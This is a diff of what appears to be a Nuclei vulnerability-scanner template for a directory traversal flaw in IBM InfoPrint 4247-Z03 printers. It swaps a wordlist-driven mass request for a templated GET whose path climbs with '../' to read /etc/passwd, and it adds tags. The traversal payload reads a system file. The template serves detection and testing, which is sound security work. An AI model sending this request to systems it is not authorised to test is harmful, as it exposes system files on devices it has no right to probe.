@@ -6,18 +6,12 @@ info:
   severity: medium
   description: Directory traversal vulnerability on IBM InfoPrint 4247-Z03 Impact Matrix Printer.
   reference: https://www.exploit-db.com/exploits/47835
-  tags: ibm,lfi
+  tags: ibm,lfi,matrix,printer
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
-      - |
-        GET /./../../../../../../../../../../etc/passwd HTTP/1.1
-        Host: {{Subdomains}}
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
     matchers-condition: and
     matchers:
       - type: status
